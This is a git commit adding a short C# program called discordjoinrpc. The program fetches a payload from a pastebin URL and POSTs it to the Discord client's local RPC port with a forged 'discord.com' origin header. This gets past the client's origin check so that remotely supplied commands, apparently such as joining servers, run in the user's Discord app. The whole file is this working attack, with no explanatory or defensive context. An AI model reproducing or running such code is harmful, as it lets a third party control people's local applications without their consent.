ebf8ada3dce708addbb13623f1fe1159c22df5ac
PareX <54591153+PareX2019@users.noreply.github.com>
2021-09-21 17:11:01 +0200

    a

---
+++ src/discordjoinrpc/Program.cs
@@ -0,0 +1,19 @@
+﻿using System.Net;
+using System.Text;
+
+namespace discordjoinrpc
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            using (WebClient wc = new WebClient())
+            {
+                byte[] b = new ASCIIEncoding().GetBytes(wc.DownloadString("https://pastebin.com/raw/HewMXTdA"));
+                wc.Headers.Add(HttpRequestHeader.ContentType, "application/json");
+                wc.Headers.Add("origin", "https://discord.com");
+                wc.UploadData("http://127.0.0.1:6463/rpc?v=1", b);
+            }
+        }
+    }
+}
